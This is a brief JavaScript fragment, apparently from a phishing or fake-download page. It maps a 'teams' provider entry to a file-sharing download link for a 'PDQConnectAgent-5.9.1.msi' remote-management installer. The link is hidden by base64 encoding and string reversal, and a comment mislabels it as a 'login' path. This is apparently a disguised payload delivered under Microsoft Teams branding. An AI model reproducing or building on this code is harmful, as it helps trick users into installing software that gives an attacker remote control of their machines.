...
const providerUrls = {
    ...
    teams: {
        ...
        e: btoa("scl/fi/jjsyaz8ac8ytwsvtqe4g7/PDQConnectAgent-5.9.1.msi?rlkey=zoj1t2xxt8a8znmzvcj8l9r0n&st=nigkxxpd&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
    },
